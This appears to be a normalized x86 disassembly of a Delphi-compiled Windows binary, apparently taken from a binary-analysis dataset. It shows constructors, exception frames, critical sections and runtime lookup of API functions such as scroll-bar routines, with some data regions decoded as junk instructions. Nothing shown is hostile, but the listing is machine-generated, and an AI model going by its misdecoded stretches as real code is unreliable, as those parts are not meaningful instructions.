mov dl 0x1
mov eax [ r-xdata ]
call sub_42a630
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404118
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42bb3c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42bc3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ba8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a680
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d824
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d824
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ba8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a680
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ba8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42a680
mov ecx r-xdata
call sub_405afc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc44
lea eax [ ebp - 0xc ]
call sub_405ab8
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
sub edx 0xfffffff8
sub_42bc5c
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42bc9c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42bccc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42be5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bdf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be65
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
mov eax esi
xor edx edx
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42a66c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42a66c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42be6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42bf51
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf58
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bb4
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a66c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405ad0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42a66c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405ad0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42c188
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c27b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40416c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c282
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bb4
lea eax [ ebp - 0x10 ]
call sub_405ab8
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42a66c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405ad0
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42c2a0
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c37f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40416c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c386
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bb4
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a66c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405ad0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42c3a0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405b2c
xor eax eax
push ebp
push sub_42c3ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c3f6
lea eax [ ebx + 0xc ]
call sub_405ab8
sub_42c3fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_42c491
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_40416c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42c188
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c498
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
call sub_42bc9c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42bccc
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42be6c
sub_42c4bc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42a66c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42a66c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418be8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42a66c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_418be8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_418be8
sub_42c548
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_42bc5c
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_40331c
mov eax [ esi + 0x14 ]
call sub_40331c
mov eax [ esi + 0x10 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_405ab8
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42c59c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c5d3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5da
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42c5e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c609
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c610
retn
sub_42c61c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c64d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c654
retn
mov eax [ rw-data ]
call sub_40331c
sub_42c660
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c694
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c6bc
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c93e
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c965
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c96c
retn
sub_42c981
leave
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
leave
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx + ecx * 8 + 0x42 ] cl
add [ eax - 0x36 ] dl
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
outsb
lea eax [ eax ]
retn
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x30 ] si
0x42
sub_42c9e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl cl
inc edx
add [ eax + eax ] bl
add [ eax ] al
or cl 0x42
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edx + ecx * 8 - 0x353bffbe ] dl
inc edx
add al dl
0x42
sub_42ca54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42ca94
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42caec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42cb11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb18
retn
sub_42cb24
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42cadc
xor eax eax
push ebp
push sub_42ccdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cce2
mov eax [ rw-data ]
call sub_42cae4
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42cce4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42cadc
xor eax eax
push ebp
push sub_42d097
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d09e
mov eax [ rw-data ]
call sub_42cae4
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42d448
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42d470
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d4b8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d4bf
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_40331c
call sub_42cb24
cmp [ rw-data ] 0x0
jg r-xdata
sub_42d4e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d505
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d50c
retn
sub_42d518
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d53d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d544
retn
sub_42d550
push ebp
mov ebp esp
